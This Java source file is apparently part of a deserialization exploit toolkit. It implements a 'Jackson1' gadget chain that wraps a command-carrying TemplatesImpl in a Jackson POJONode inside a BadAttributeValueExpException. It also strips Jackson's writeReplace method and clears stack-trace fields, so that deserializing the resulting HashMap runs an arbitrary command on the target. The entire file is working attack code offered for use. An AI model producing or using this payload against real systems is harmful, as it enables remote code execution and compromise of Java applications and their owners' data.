package com.qi4l.JYso.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.Reflections;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;

import static com.qi4l.JYso.gadgets.utils.Reflections.setFieldValue;

// 在触发 getter 的时候是以随机顺序触发的,所以概率打空
public class Jackson1 implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        final Object tempImpl;
        tempImpl = Gadgets.createTemplatesImpl(command);

        try {
            CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            ctClass.removeMethod(writeReplace);
            ctClass.toClass();
        } catch (Exception EE) {

        }

        POJONode node = new POJONode(tempImpl);

        BadAttributeValueExpException val  = new BadAttributeValueExpException(null);
        setFieldValue(val, "val", node);
        //清除堆栈信息
        setFieldValue(val, "stackTrace", new StackTraceElement[0]);
        setFieldValue(val, "cause", null);
        setFieldValue(val, "suppressedExceptions", null);

        HashMap hashMap = new HashMap();
        hashMap.put(tempImpl, val);

        return hashMap;
    }
}
